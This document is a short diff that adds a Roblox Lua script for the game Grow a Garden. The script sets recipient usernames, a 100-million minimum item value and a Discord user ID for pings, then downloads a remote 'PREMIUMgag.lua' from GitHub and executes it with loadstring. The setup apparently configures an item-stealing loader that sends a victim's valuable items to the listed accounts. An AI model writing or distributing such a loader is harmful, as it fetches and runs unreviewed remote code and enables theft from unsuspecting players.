@@ -1,0 +1,6 @@
+_G.Usernames = {"DashScriptsYTz", "DashScriptsYTz1", "DashScriptsYTz2"} -- you can add as many as you'd like
+_G.min_value = 100000000 -- 100 million
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "1269701634217480267" -- change to your Discord user ID
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/kjrmz/GrowAGarden/refs/heads/main/PREMIUMgag.lua'))()
